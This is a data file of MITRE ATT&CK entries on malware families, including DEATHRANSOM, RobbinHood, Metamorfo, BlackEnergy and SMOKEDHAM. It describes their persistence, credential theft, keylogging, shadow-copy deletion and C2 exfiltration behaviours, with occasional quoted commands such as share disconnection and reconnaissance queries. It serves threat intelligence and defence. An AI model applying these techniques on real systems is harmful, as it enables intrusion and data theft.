{"text": " [DEATHRANSOM](https://attack.mitre.org/software/S0616) is ransomware written in C that has been used since at least 2020, and has potential overlap with [FIVEHANDS](https://attack.mitre.org/software/S0618) and [HELLOKITTY](https://attack.mitre.org/software/S0617).(Citation: FireEye FiveHands April 2021)", "idx": "https://attack.mitre.org/software/S0616", "title": "DEATHRANSOM", "entity": "DEATHRANSOM", "entity_type": "software", "entity_context": ["DEATHRANSOM can enumerate logical drives on a target system.", "DEATHRANSOM can use public and private key pair encryption to encrypt files for ransom payment.", "DEATHRANSOM can use loop operations to enumerate directories on a compromised host.", "DEATHRANSOM has the ability to use loop operations to enumerate network resources.", "Some versions of DEATHRANSOM have performed language ID and keyboard layout checks; if either of these matched Russian, Kazakh, Belarusian, Ukrainian or Tatar DEATHRANSOM would exit.", "DEATHRANSOM can delete volume shadow copies on compromised hosts.", "DEATHRANSOM has the ability to use WMI to delete volume shadow copies.", "DEATHRANSOM can use HTTPS to download files.", "DEATHRANSOM can download files to a compromised host."], "is_subtechnique": false}
{"text": " [RobbinHood](https://attack.mitre.org/software/S0400) is ransomware that was first observed being used in an attack against the Baltimore city government's computer network.(Citation: CarbonBlack RobbinHood May 2019)(Citation: BaltimoreSun RobbinHood May 2019)", "idx": "https://attack.mitre.org/software/S0400", "title": "RobbinHood", "entity": "RobbinHood", "entity_type": "software", "entity_context": ["RobbinHood disconnects all network shares from the computer with the command <code>net use * /DELETE /Y</code>.", "RobbinHood deletes shadow copies to ensure that all the data cannot be restored easily. ", "RobbinHood stops 181 Windows services on the system before beginning the encryption process. ", "RobbinHood will search for an RSA encryption key and then perform its encryption process on the system files. ", "RobbinHood will search for Windows services that are associated with antivirus software on the system and kill the process. ", "RobbinHood uses cmd.exe on the victim's computer."], "is_subtechnique": false}
{"text": " [DustySky](https://attack.mitre.org/software/S0062) is multi-stage malware written in .NET that has been used by [Molerats](https://attack.mitre.org/groups/G0021) since May 2015. (Citation: DustySky) (Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019)", "idx": "https://attack.mitre.org/software/S0062", "title": "DustySky", "entity": "DustySky", "entity_type": "software", "entity_context": ["DustySky searches for removable media and duplicates itself onto it.", "DustySky checks for the existence of anti-virus.", "DustySky can compress files via RAR while staging data to be exfiltrated.", "DustySky scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.", "DustySky captures PNG screenshots of the main screen.", "DustySky searches for network drives and removable media and duplicates itself onto them.", "DustySky can detect connected USB devices.", "DustySky has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.", "The DustySky dropper uses a function to obfuscate the name of functions and other parts of the malware.", "DustySky contains a keylogger.", "The DustySky dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.", "DustySky collects information about running processes from victims.", "DustySky achieves persistence by creating a Registry entry in <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.", "DustySky can delete files it creates from the infected system.", "DustySky created folders in temp directories to host collected files before exfiltration.", "DustySky lists all installed software for the infected machine.", "DustySky has exfiltrated data to the C2 server.", "DustySky has used both HTTP and HTTPS for C2.", "DustySky extracts basic information about the operating system."], "is_subtechnique": false}
{"text": " [LockerGoga](https://attack.mitre.org/software/S0372) is ransomware that has been tied to various attacks on European companies. It was first reported upon in January 2019.(Citation: Unit42 LockerGoga 2019)(Citation: CarbonBlack LockerGoga 2019)", "idx": "https://attack.mitre.org/software/S0372", "title": "LockerGoga", "entity": "LockerGoga", "entity_type": "software", "entity_context": ["LockerGoga has been observed changing account passwords and logging off current users.", "LockerGoga has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.", "LockerGoga has been signed with stolen certificates in order to make it look more legitimate.", "LockerGoga has been observed deleting its original launcher after execution.", "LockerGoga has been observed shutting down infected systems.", "LockerGoga has encrypted files, including core Windows OS files, using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key.", "LockerGoga installation has been immediately preceded by a \"task kill\" command in order to disable anti-virus."], "is_subtechnique": false}
{"text": " [Matryoshka](https://attack.mitre.org/software/S0167) is a malware framework used by [CopyKittens](https://attack.mitre.org/groups/G0052) that consists of a dropper, loader, and RAT. It has multiple versions; v1 was seen in the wild from July 2016 until January 2017. v2 has fewer commands and other minor differences. (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)", "idx": "https://attack.mitre.org/software/S0167", "title": "Matryoshka", "entity": "Matryoshka", "entity_type": "software", "entity_context": ["Matryoshka can establish persistence by adding Registry Run keys.", "Matryoshka is capable of keylogging.", "Matryoshka obfuscates API function names using a substitute cipher combined with Base64 encoding.", "Matryoshka is capable of stealing Outlook passwords.", "Matryoshka uses reflective DLL injection to inject the malicious library and execute the RAT.", "Matryoshka is capable of providing Meterpreter shell access.", "Matryoshka is capable of performing screen captures.", "Matryoshka can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\".", "Matryoshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.", "Matryoshka uses DNS for C2."], "is_subtechnique": false}
{"text": " [HOPLIGHT](https://attack.mitre.org/software/S0376) is a backdoor Trojan that has reportedly been used by the North Korean government.(Citation: US-CERT HOPLIGHT Apr 2019)", "idx": "https://attack.mitre.org/software/S0376", "title": "HOPLIGHT", "entity": "HOPLIGHT", "entity_type": "software", "entity_context": ["HOPLIGHT has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.\t", "HOPLIGHT has been observed enumerating system drives and partitions.\t", "HOPLIGHT has been observed collecting victim machine information like OS version, drivers, volume information and more.", "HOPLIGHT has the ability to connect to a remote host in order to upload and download files.\t", "HOPLIGHT has used svchost.exe to execute a malicious DLL .", "HOPLIGHT has been observed collecting system time from victim machines.", "HOPLIGHT has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.\t", "HOPLIGHT has utilized Zlib compression to obfuscate the communications payload. \t\n", "HOPLIGHT has been observed loading several APIs associated with Pass the Hash.\t", "HOPLIGHT can launch cmd.exe to execute commands on the system.\t", "HOPLIGHT has multiple proxy options that mask traffic between the malware and the remote operators.\t\n", "HOPLIGHT has the capability to harvest credentials and passwords from the SAM database.\t", "HOPLIGHT has multiple C2 channels in place in case one fails.\t", "A variant of HOPLIGHT hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key <code>SYSTEM\\CurrentControlSet\\Control\\Lsa Name</code>.", "HOPLIGHT has modified the firewall using netsh.\t", "HOPLIGHT has connected outbound over TCP port 443. \t", "HOPLIGHT has used its C2 channel to exfiltrate data.\t", "HOPLIGHT has injected into running processes.\t", "HOPLIGHT has connected outbound over TCP port 443 with a FakeTLS method."], "is_subtechnique": false}
{"text": " [Metamorfo](https://attack.mitre.org/software/S0455) is a Latin-American banking trojan operated by a Brazilian cybercrime group that has been active since at least April 2018. The group focuses on targeting banks and cryptocurrency services in Brazil and Mexico.(Citation: Medium Metamorfo Apr 2020)(Citation: ESET Casbaneiro Oct 2019)", "idx": "https://attack.mitre.org/software/S0455", "title": "Metamorfo", "entity": "Metamorfo", "entity_type": "software", "entity_context": ["Metamorfo had used AutoIt to load and execute the DLL payload. ", "Metamorfo has digitally signed executables using AVAST Software certificates. ", "Upon execution, Metamorfo has unzipped itself after being downloaded to the system and has performed string decryption. ", "Metamorfo can collect screenshots of the victim’s machine. ", "Metamorfo has performed process name checks and has monitored applications. ", "Metamorfo has used MSI files to download additional files to execute. ", "Metamorfo uses JavaScript to get the system time. ", "Metamorfo has encrypted C2 commands with AES-256. ", "Metamorfo has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).", "Metamorfo has used raw TCP for C2. ", "Metamorfo has a command to launch a keylogger and capture keystrokes on the victim’s machine. ", "Metamorfo has used native WINAPI calls.", "Metamorfo has used VMProtect to pack and protect files. ", "Metamorfo has a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's.", "Metamorfo has displayed fake forms on top of banking sites to intercept credentials from victims. ", "Metamorfo has used mshta.exe to execute a HTA payload. ", "Metamorfo has automatically collected mouse clicks, continuous screenshots on the machine, and set timers to collect the contents of the clipboard and website browsing. ", "Metamorfo has a command to delete a Registry key it uses, <code>\\Software\\Microsoft\\Internet Explorer\\notes</code>. ", "Metamorfo has collected the hostname and operating system version from the compromised host.", "Metamorfo has a function to kill processes associated with defenses and can prevent certain processes from launching. ", "Metamorfo has searched the Program Files directories for specific folders and has searched for strings related to its mutexes. ", "Metamorfo includes payloads written in JavaScript. ", "Metamorfo requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer. ", "Metamorfo has used <code>cmd.exe /c</code> to execute files. ", "Metamorfo has been delivered to victims via emails with malicious HTML attachments. ", "Metamorfo has side-loaded its malicious DLL file. ", "Metamorfo has embedded a \"vmdetect.exe\" executable to identify virtual machines at the beginning of execution. ", "Metamorfo has used YouTube to store and hide C&C server domains.", "Metamorfo has hidden its GUI using the ShowWindow() WINAPI call. ", "Metamorfo has searched the compromised system for banking applications.", "Metamorfo has downloaded a zip file for execution on the system. ", "Metamorfo has deleted itself from the system after execution.", "Metamorfo has used HTTP for C2. ", "Metamorfo can enumerate all windows on the victim’s machine.", "Metamorfo has configured persistence to the Registry ket <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, Spotify =% APPDATA%\\Spotify\\Spotify.exe</code> and used .LNK files in the startup folder to achieve persistence.", "Metamorfo has communicated with hosts over raw TCP on port 9999. ", "Metamorfo has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address. ", "Metamorfo collects a list of installed antivirus software from the victim’s system. ", "Metamorfo has collected the username from the victim's machine. ", "Metamorfo's C2 communication has been encrypted using OpenSSL. ", "Metamorfo has used VBS code on victims’ systems.", "Metamorfo has used MsiExec.exe to automatically execute files. ", "Metamorfo has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive, WhatsApp, or Spotify, for example. ", "Metamorfo has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.", "Metamorfo has encrypted payloads and strings.", "Metamorfo can send the data it collects to the C2 server. "], "is_subtechnique": false}
{"text": " [TSCookie](https://attack.mitre.org/software/S0436) is a remote access tool (RAT) that has been used by [BlackTech](https://attack.mitre.org/groups/G0098) in campaigns against Japanese targets.(Citation: JPCert TSCookie March 2018)(Citation: JPCert BlackTech Malware September 2019). [TSCookie](https://attack.mitre.org/software/S0436) has been referred to as [PLEAD](https://attack.mitre.org/software/S0435) though more recent reporting indicates a separation between the two.(Citation: JPCert PLEAD Downloader June 2018)(Citation: JPCert BlackTech Malware September 2019)", "idx": "https://attack.mitre.org/software/S0436", "title": "TSCookie", "entity": "TSCookie", "entity_type": "software", "entity_context": ["TSCookie has the ability to proxy communications with command and control (C2) servers.", "TSCookie can use ICMP to receive information on the destination server.", "TSCookie has the ability to upload and download files to and from the infected host.", "TSCookie has the ability to execute shell commands on the infected host.", "TSCookie can multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers.", "TSCookie has encrypted network communications with RC4.", "TSCookie has the ability to list processes on the infected host.", "TSCookie has the ability to identify the IP of the infected host.", "TSCookie has been executed via malicious links embedded in e-mails spoofing the Ministries of Education, Culture, Sports, Science and Technology of Japan.", "TSCookie has the ability to decrypt, load, and execute a DLL and its resources.", "TSCookie has the ability to steal saved passwords from the Internet Explorer, Edge, Firefox, and Chrome browsers.", "TSCookie has the ability to discover drive information on the infected host.", "TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes."], "is_subtechnique": false}
{"text": " [Regin](https://attack.mitre.org/software/S0019) is a malware platform that has targeted victims in a range of industries, including telecom, government, and financial institutions. Some [Regin](https://attack.mitre.org/software/S0019) timestamps date back to 2003. (Citation: Kaspersky Regin)", "idx": "https://attack.mitre.org/software/S0019", "title": "Regin", "entity": "Regin", "entity_type": "software", "entity_context": ["Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.", "Regin has used a hidden file system to store some of its components.", "The Regin malware platform supports many standard protocols, including HTTP and HTTPS.", "Regin appears to have functionality to modify remote Registry information.", "The Regin malware platform supports many standard protocols, including SMB.", "Regin stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.", "Regin contains a keylogger.", "The Regin malware platform can use Windows admin shares to move laterally.", "The Regin malware platform uses Extended Attributes to store encrypted executables.", "Regin leveraged several compromised universities as proxies to obscure its origin.", "The Regin malware platform can use ICMP to communicate between infected computers."], "is_subtechnique": false}
{"text": " [adbupd](https://attack.mitre.org/software/S0202) is a backdoor used by [PLATINUM](https://attack.mitre.org/groups/G0068) that is similar to [Dipsind](https://attack.mitre.org/software/S0200). (Citation: Microsoft PLATINUM April 2016)", "idx": "https://attack.mitre.org/software/S0202", "title": "adbupd", "entity": "adbupd", "entity_type": "software", "entity_context": ["adbupd contains a copy of the OpenSSL library to encrypt C2 traffic.", "adbupd can run a copy of cmd.exe.", "adbupd can use a WMI script to achieve persistence."], "is_subtechnique": false}
{"text": " [down_new](https://attack.mitre.org/software/S0472) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)", "idx": "https://attack.mitre.org/software/S0472", "title": "down_new", "entity": "down_new", "entity_type": "software", "entity_context": ["down_new has the ability to base64 encode C2 communications.", "down_new has the ability to use HTTP in C2 communications.", "down_new has the ability to list the directories on a compromised host.", "down_new has the ability to identify the system volume information of a compromised host.", "down_new has the ability to identify the MAC address of a compromised host.", "down_new has the ability to gather information on installed applications.", "down_new has the ability to AES encrypt C2 communications.", "down_new has the ability to download files to the compromised host.", "down_new has the ability to list running processes on a compromised host.", "down_new has the ability to detect anti-virus products and processes on a compromised host."], "is_subtechnique": false}
{"text": " [Pony](https://attack.mitre.org/software/S0453) is a credential stealing malware, though has also been used among adversaries for its downloader capabilities. The source code for Pony Loader 1.0 and 2.0 were leaked online, leading to their use by various threat actors.(Citation: Malwarebytes Pony April 2016)", "idx": "https://attack.mitre.org/software/S0453", "title": "Pony", "entity": "Pony", "entity_type": "software", "entity_context": ["Pony has used several Windows functions for various purposes.\t", "Pony has used the Adobe Reader icon for the downloaded file to look more trustworthy.\t", "Pony attachments have been delivered via compressed archive files. Pony also obfuscates the memory flow by adding junk instructions when executing to make analysis more difficult.\t", "Pony has used scripts to delete itself after execution.\t", "Pony has used batch scripts to delete itself after execution.\t", "Pony has used the <code>NetUserEnum</code> function to enumerate local accounts.\t", "Pony has used a small dictionary of common passwords against a collected list of local accounts.\t", "Pony can download additional files onto the infected system.\t", "Pony has been delivered via spearphishing emails which contained malicious links.\t", "Pony has attempted to lure targets into downloading an attached executable (ZIP, RAR, or CAB archives) or document (PDF or other MS Office format).", "Pony has attempted to lure targets into clicking links in spoofed emails from legitimate banks.\t", "Pony has delayed execution using a built-in function to avoid detection and analysis.\t", "Pony has sent collected information to the C2 via HTTP POST request.\t", "Pony has been delivered via spearphishing attachments.", "Pony has collected the Service Pack, language, and region information to send to the C2.\t"], "is_subtechnique": false}
{"text": " [Kobalos](https://attack.mitre.org/software/S0641) is a multi-platform backdoor that can be used against Linux, FreeBSD, and Solaris. [Kobalos](https://attack.mitre.org/software/S0641) has been deployed against high profile targets, including high-performance computers, academic servers, an endpoint security vendor, and a large internet service provider; it has been found in Europe, North America, and Asia. [Kobalos](https://attack.mitre.org/software/S0641) was first identified in late 2019.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021)", "idx": "https://attack.mitre.org/software/S0641", "title": "Kobalos", "entity": "Kobalos", "entity_type": "software", "entity_context": ["Kobalos encrypts all strings using RC4 and bundles all functionality into a single function call. ", "Kobalos's post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic. ", "Kobalos is triggered by an incoming TCP connection to a legitimate service from a specific source port. ", "Kobalos's authentication and key exchange is performed using RSA-512. ", "Kobalos can write captured SSH connection credentials to a file under the <code>/var/run</code> directory with a <code>.pid</code> extension for exfiltration. ", "Kobalos has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host. ", "Kobalos can modify timestamps of replaced files, such as <code>ssh</code> with the added credential stealer or <code>sshd</code> used to deploy Kobalos. ", "Kobalos can remove all command history on compromised hosts.\t", "Kobalos decrypts strings right after the initial communication, but before the authentication process. ", "Kobalos can spawn a new pseudo-terminal and execute arbitrary commands at the command prompt. ", "Kobalos can record the hostname and kernel version of the target machine.", "Kobalos can record the IP address of the target machine.", "Kobalos can exfiltrate credentials over the network via UDP. ", "Kobalos replaced the SSH client with a trojanized SSH client to steal credentials on compromised systems.", "Kobalos can chain together multiple compromised machines as proxies to reach their final targets."], "is_subtechnique": false}
{"text": " [MimiPenguin](https://attack.mitre.org/software/S0179) is a credential dumper, similar to [Mimikatz](https://attack.mitre.org/software/S0002), designed specifically for Linux platforms. (Citation: MimiPenguin GitHub May 2017)", "idx": "https://attack.mitre.org/software/S0179", "title": "MimiPenguin", "entity": "MimiPenguin", "entity_type": "software", "entity_context": ["MimiPenguin can dump process memory and extract clear-text credentials."], "is_subtechnique": false}
{"text": " [DOGCALL](https://attack.mitre.org/software/S0213) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) that has been used to target South Korean government and military organizations in 2017. It is typically dropped using a Hangul Word Processor (HWP) exploit. (Citation: FireEye APT37 Feb 2018)", "idx": "https://attack.mitre.org/software/S0213", "title": "DOGCALL", "entity": "DOGCALL", "entity_type": "software", "entity_context": ["DOGCALL is capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.", "DOGCALL is capable of capturing screenshots of the victim's machine.", "DOGCALL can capture microphone data from the victim's machine.", "DOGCALL is encrypted using single-byte XOR.", "DOGCALL can download and execute additional payloads.", "DOGCALL is capable of logging keystrokes."], "is_subtechnique": false}
{"text": " [BlackEnergy](https://attack.mitre.org/software/S0089) is a malware toolkit that has been used by both criminal and APT actors. It dates back to at least 2007 and was originally designed to create botnets for use in conducting Distributed Denial of Service (DDoS) attacks, but its use has evolved to support various plug-ins. It is well known for being used during the confrontation between Georgia and Russia in 2008, as well as in targeting Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3. (Citation: F-Secure BlackEnergy 2014)", "idx": "https://attack.mitre.org/software/S0089", "title": "BlackEnergy", "entity": "BlackEnergy", "entity_type": "software", "entity_context": ["BlackEnergy has removed the watermark associated with enabling the <code>TESTSIGNING</code> boot configuration option by removing the relevant strings in the <code>user32.dll.mui</code> of the system.", "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.", "BlackEnergy can gather very specific information about attached USB devices, to include device instance ID and drive geometry.", "BlackEnergy gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. BlackEnergy has searched for given file types.", "BlackEnergy attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.", "A BlackEnergy 2 plug-in uses WMI to gather victim host details.", "BlackEnergy has gathered information about local network connections using netstat.", "BlackEnergy has used Systeminfo to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.", "BlackEnergy 2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents.", "BlackEnergy is capable of taking screenshots.", "BlackEnergy has the capability to communicate over a backup channel via plus.google.com.", "BlackEnergy has gathered information about network IP configurations using ipconfig.exe and about routing tables using route.exe.", "BlackEnergy has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Outlook, and Windows Credential Store.", "BlackEnergy has gathered a process list by using Tasklist.exe.", "One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.", "BlackEnergy has enabled the <code>TESTSIGNING</code> boot configuration option to facilitate loading of a driver component.", "BlackEnergy has conducted port scans on a host.", "BlackEnergy communicates with its C2 server over HTTP.", "One variant of BlackEnergy creates a new service using either a hard-coded or randomly generated name.", "BlackEnergy injects its DLL component into svchost.exe.", "BlackEnergy has run a keylogger plug-in on a victim.", "The BlackEnergy component KillDisk is capable of deleting Windows Event Logs.", "BlackEnergy has used a plug-in to gather credentials from web browsers including FireFox, Google Chrome, and Internet Explorer.", "BlackEnergy has run a plug-in on a victim to spread through the local network by using PsExec and accessing admin shares."], "is_subtechnique": false}
{"text": " [MiniDuke](https://attack.mitre.org/software/S0051) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. The [MiniDuke](https://attack.mitre.org/software/S0051) toolset consists of multiple downloader and backdoor components. The loader has been used with other [MiniDuke](https://attack.mitre.org/software/S0051) components as well as in conjunction with [CosmicDuke](https://attack.mitre.org/software/S0050) and [PinchDuke](https://attack.mitre.org/software/S0048). (Citation: F-Secure The Dukes)", "idx": "https://attack.mitre.org/software/S0051", "title": "MiniDuke", "entity": "MiniDuke", "entity_type": "software", "entity_context": ["Some MiniDuke components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.", "MiniDuke uses HTTP and HTTPS for command and control.", "MiniDuke can use control flow flattening to obscure code.", "MiniDuke can download additional encrypted backdoors onto the victim via GIF files.", "MiniDuke can gather the hostname on a compromised machine.", "MiniDuke can can use a named pipe to forward communications from one compromised machine with internet access to other compromised machines.", "MiniDuke can use DGA to generate new Twitter URLs for C2.", "MiniDuke can enumerate local drives.", "MiniDuke uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working."], "is_subtechnique": false}
{"text": " [CCBkdr](https://attack.mitre.org/software/S0222) is malware that was injected into a signed version of CCleaner and distributed from CCleaner's distribution website. (Citation: Talos CCleanup 2017) (Citation: Intezer Aurora Sept 2017)", "idx": "https://attack.mitre.org/software/S0222", "title": "CCBkdr", "entity": "CCBkdr", "entity_type": "software", "entity_context": ["CCBkdr can use a DGA for Fallback Channels if communications with the primary command and control server are lost.", "CCBkdr was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site."], "is_subtechnique": false}
{"text": " [Sykipot](https://attack.mitre.org/software/S0018) is malware that has been used in spearphishing campaigns since approximately 2007 against victims primarily in the US. One variant of [Sykipot](https://attack.mitre.org/software/S0018) hijacks smart cards on victims. (Citation: Alienvault Sykipot DOD Smart Cards) The group using this malware has also been referred to as Sykipot. (Citation: Blasco 2013)", "idx": "https://attack.mitre.org/software/S0018", "title": "Sykipot", "entity": "Sykipot", "entity_type": "software", "entity_context": ["Sykipot may use <code>net view /domain</code> to display hostnames of available systems on a network.", "Sykipot contains keylogging functionality to steal passwords.", "Sykipot may gather a list of running processes by running <code>tasklist /v</code>.", "Sykipot may use <code>net group \"domain admins\" /domain</code> to display accounts in the \"domain admins\" permissions group and <code>net localgroup \"administrators\"</code> to list local system administrator group membership.", "Sykipot may use <code>net start</code> to display running services.", "Sykipot injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.", "Sykipot may use <code>ipconfig /all</code> to gather system network configuration details.", "Sykipot uses SSL for encrypting C2 communications.", "Sykipot has been known to establish persistence by adding programs to the Run Registry key.", "Sykipot is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.", "Sykipot may use <code>netstat -ano</code> to display active network connections."], "is_subtechnique": false}
{"text": " [Proxysvc](https://attack.mitre.org/software/S0238) is a malicious DLL used by [Lazarus Group](https://attack.mitre.org/groups/G0032) in a campaign known as Operation GhostSecret. It has appeared to be operating undetected since 2017 and was mostly observed in higher education organizations. The goal of [Proxysvc](https://attack.mitre.org/software/S0238) is to deliver additional payloads to the target and to maintain control for the attacker. It is in the form of a DLL that can also be executed as a standalone process. (Citation: McAfee GhostSecret)", "idx": "https://attack.mitre.org/software/S0238", "title": "Proxysvc", "entity": "Proxysvc", "entity_type": "software", "entity_context": ["Proxysvc lists files in directories.", "Proxysvc uses port 443 for the control server communications.", "Proxysvc lists processes running on the system.", "Proxysvc collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.", "Proxysvc searches the local system and gathers data.", "Proxysvc collects the network adapter information and domain/username information based on current remote sessions.", "Proxysvc can overwrite files indicated by the attacker before deleting them.", "Proxysvc registers itself as a service on the victim’s machine to run as a standalone process.", "As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server.", "Proxysvc gathers product names from the Registry key: <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName</code> and the processor description from the Registry key <code>HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString</code>.", "Proxysvc can delete files indicated by the attacker and remove itself from disk using a batch file.", "Proxysvc automatically collects data about the victim and sends it to the control server.", "Proxysvc uses HTTP over SSL to communicate commands with the control server.", "Proxysvc performs data exfiltration over the control server channel using a custom protocol.", "Proxysvc executes a binary on the system and logs the results into a temp file by using: <code>cmd.exe /c \"<file_path> > %temp%\\PM* .tmp 2>&1\"</code>."], "is_subtechnique": false}
{"text": " [AppleSeed](https://attack.mitre.org/software/S0622) is a backdoor that has been used by [Kimsuky](https://attack.mitre.org/groups/G0094) to target South Korean government, academic, and commercial targets since at least 2021.(Citation: Malwarebytes Kimsuky June 2021)", "idx": "https://attack.mitre.org/software/S0622", "title": "AppleSeed", "entity": "AppleSeed", "entity_type": "software", "entity_context": ["AppleSeed can disguise JavaScript files as PDFs.", "AppleSeed can delete files from a compromised host after they are exfiltrated.", "AppleSeed has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.", "AppleSeed can stage files in a central location prior to exfiltration.", "AppleSeed has the ability to Base64 encode its payload and custom encrypt API calls.", "AppleSeed has been distributed to victims through malicious e-mail attachments.", "AppleSeed can take screenshots on a compromised host by calling a series of APIs.", "AppleSeed has the ability to communicate with C2 over HTTP.", "AppleSeed has the ability to create the Registry key name <code>EstsoftAutoUpdate</code> at <code>HKLU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnce</code> to establish persistence.", "AppleSeed can exfiltrate files via the C2 channel.", "AppleSeed can collect data on a compromised host.", "AppleSeed can find and collect data from removable media devices.", "AppleSeed can gain system level privilege by passing <code>SeDebugPrivilege</code> to the <code>AdjustTokenPrivilege</code> API.", "AppleSeed can enumerate the current process on a compromised host.", "AppleSeed can use <code>GetKeyState</code> and <code>GetKeyboardState</code> to capture keystrokes on the victim’s machine. ", "AppleSeed can use a second channel for C2 when the primary channel is in upload mode.", "AppleSeed has the ability to execute its payload via PowerShell.", "AppleSeed can call regsvr32.exe for execution.", "AppleSeed can identify the IP of a targeted system.", "AppleSeed can identify the OS version of a targeted system.", "AppleSeed can zip and encrypt data collected on a target system.", "AppleSeed has used UPX packers for its payload DLL.", "AppleSeed can achieve execution through users running malicious file attachments distributed via email.", "AppleSeed has the ability to use multiple dynamically resolved API calls.", "AppleSeed has the ability to use JavaScript to execute PowerShell.", "AppleSeed can pull a timestamp from the victim's machine.", "AppleSeed can decode its payload prior to execution.", "AppleSeed has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity."], "is_subtechnique": false}
{"text": " [SMOKEDHAM](https://attack.mitre.org/software/S0649) is a Powershell-based .NET backdoor that was first reported in May 2021; it has been used by at least one ransomware-as-a-service affiliate.(Citation: FireEye Shining A Light on DARKSIDE May 2021)(Citation: FireEye SMOKEDHAM June 2021)", "idx": "https://attack.mitre.org/software/S0649", "title": "SMOKEDHAM", "entity": "SMOKEDHAM", "entity_type": "software", "entity_context": ["SMOKEDHAM has encrypted its C2 traffic with RC4.", "SMOKEDHAM has relied upon users clicking on a malicious link delivered through phishing.", "SMOKEDHAM can execute Powershell commands sent from its C2 server.", "SMOKEDHAM has used <code>reg.exe</code> to create a Registry Run key.", "SMOKEDHAM has used Powershell to download UltraVNC and Ngrok from third-party file sharing sites.", "SMOKEDHAM has exfiltrated data to its C2 server.", "SMOKEDHAM has used <code>whoami</code> commands to identify system owners.", "SMOKEDHAM can continuously capture keystrokes.", "SMOKEDHAM has used <code>net.exe user</code> and <code>net.exe users</code> to enumerate local accounts on a compromised host.", "The SMOKEDHAM source code is embedded in the dropper as an encrypted string.", "SMOKEDHAM has created user accounts and added them to local Admin groups.", "SMOKEDHAM has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.", "SMOKEDHAM has encoded its C2 traffic with Base64.", "SMOKEDHAM can capture screenshots of the victim’s desktop.", "SMOKEDHAM has been delivered via malicious links in phishing emails.", "SMOKEDHAM has used the <code>systeminfo</code> command on a compromised host.", "SMOKEDHAM has communicated with its C2 servers via HTTPS and HTTP POST requests.", "SMOKEDHAM has modified the Registry to hide created user accounts from the Windows logon screen. ", "SMOKEDHAM has used a fronted domain to obfuscate its hard-coded C2 server domain.", "SMOKEDHAM has added created user accounts to local Admin groups.", "SMOKEDHAM has used Google Drive and Dropbox to host files downloaded by victims via malicious links."], "is_subtechnique": false}
